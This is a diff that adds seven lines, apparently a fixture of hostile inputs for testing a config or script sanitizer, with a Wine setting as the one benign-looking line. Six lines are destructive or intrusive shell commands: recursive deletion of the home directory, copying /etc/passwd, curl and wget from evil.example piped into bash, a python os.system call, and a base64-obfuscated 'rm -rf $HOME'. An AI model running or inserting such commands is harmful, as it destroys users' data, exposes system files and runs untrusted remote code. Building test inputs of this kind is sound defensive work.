@@ -1,0 +1,7 @@
+rm -rf "$HOME"
+cat /etc/passwd > /tmp/WB_M4_STOLEN_$$
+curl http://evil.example/x.sh | bash
+wget -O - http://evil.example/x.sh | bash
+python3 -c "import os; os.system('id')"
+eval "$(echo cm0gLXJmICRIT01F | base64 -d)"
+PW_WINE_USE=WINE-BLEEDING
